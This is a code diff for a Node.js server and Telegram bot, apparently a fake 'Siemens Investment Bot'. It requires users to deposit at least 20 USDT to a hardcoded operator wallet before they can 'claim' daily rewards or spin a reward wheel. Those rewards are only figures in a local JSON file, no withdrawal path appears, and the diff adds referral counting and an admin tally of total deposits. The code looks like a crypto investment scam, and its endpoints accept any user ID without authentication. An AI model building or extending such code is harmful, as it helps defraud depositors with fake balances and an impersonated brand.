@@ -13,8 +13,6 @@ const ADMIN_CHAT_ID = '6559439220';
 const MY_WALLET_ADDRESS = '0xDdAE2e4e81A39C4E68faFAFd8b6aa05192f7A123';
 
 const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
-
-// استفاده از دیتابیس فایل JSON برای جلوگیری از خطای کامپایل روی رندر و حفظ موجودی‌ها
 const DB_FILE = path.join(__dirname, 'database.json');
 
 function readDatabase() {
@@ -38,7 +36,7 @@ fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
 
 app.use(express.static(path.join(__dirname, 'public')));
 
-// API دریافت موجودی برای مینی‌اپ
+// API دریافت اطلاعات کاربر
 app.get('/api/user', (req, res) => {
 const userId = req.query.userId || '6559439220';
 const db = readDatabase();
@@ -62,17 +60,46 @@ voucherCount: db[userId].voucherCount
 });
 });
 
+// API ثبت پاداش روزانه
+app.post('/api/claim-daily', (req, res) => {
+const { userId } = req.body;
+const db = readDatabase();
+if (!db[userId]) return res.json({ success: false, message: 'User not found' });
+
+if (db[userId].totalDeposited < 20.00) {
+return res.json({ success: false, message: 'Minimum deposit required is 20 USDT' });
+}
+
+db[userId].balance += 1.00;
+saveDatabase(db);
+res.json({ success: true, newBalance: db[userId].balance });
+});
+
+// API گردونه شانس
+app.post('/api/spin', (req, res) => {
+const { userId } = req.body;
+const db = readDatabase();
+if (!db[userId]) return res.json({ success: false, message: 'User not found' });
+
+if (db[userId].totalDeposited < 20.00) {
+return res.json({ success: false, message: 'Minimum deposit required is 20 USDT' });
+}
+
+const reward = parseFloat((Math.random() * 5).toFixed(2));
+db[userId].balance += reward;
+saveDatabase(db);
+res.json({ success: true, reward, newBalance: db[userId].balance });
+});
+
+// API اطلاعات واریز
 const walletData = {
 status: 'success',
 address: MY_WALLET_ADDRESS,
 network: 'BEP20 (USDT)'
 };
-
 app.get('/api/deposit', (req, res) => res.json(walletData));
-app.get('/api/wallet', (req, res) => res.json(walletData));
-app.get('/api/get-address', (req, res) => res.json(walletData));
 
-// ربات تلگرام
+// --- ربات تلگرام ---
 function sendMainMenu(chatId, text) {
 bot.sendMessage(chatId, text, {
 reply_markup: {
@@ -98,9 +125,29 @@ refCount: 0,
 voucherCount: 0,
 referredBy: referrerId
 };
+if (referrerId && db[referrerId]) {
+db[referrerId].refCount = (db[referrerId].refCount || 0) + 1;
+}
 saveDatabase(db);
 }
 sendMainMenu(chatId, 'Welcome to Siemens Investment Bot!');
+});
+
+bot.onText(/\/admin/, (msg) => {
+const chatId = msg.chat.id.toString();
+if (chatId !== ADMIN_CHAT_ID) return;
+
+const db = readDatabase();
+const users = Object.keys(db);
+let totalDep = 0;
+let totalBal = 0;
+users.forEach(u => {
+totalDep += db[u].totalDeposited || 0;
+totalBal += db[u].balance || 0;
+});
+
+const stats = '👑 *Admin Control Panel*\n\n👥 Total Users: *' + users.length + '*\n💰 Total Deposits: *' + totalDep.toFixed(2) + ' USDT*\n🏦 Total Balances: *' + totalBal.toFixed(2) + ' USDT*';
+bot.sendMessage(chatId, stats, { parse_mode: 'Markdown' });
 });
 
 bot.on('callback_query', async (query) => {
@@ -130,7 +177,7 @@ bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
 if (data === 'referral') {
 bot.getMe().then((botInfo) => {
 const refLink = 'https://t.me/' + botInfo.username + '?start=' + chatId;
-bot.sendMessage(chatId, '👥 *Your Referral Link:*\n\n`' + refLink + '`', { parse_mode: 'Markdown' });
+bot.sendMessage(chatId, '👥 *Your Referral Link:*\n\n`' + refLink + '`\n\nTotal Referrals: *' + (db[chatId].refCount || 0) + '*', { parse_mode: 'Markdown' });
 });
 }
 });
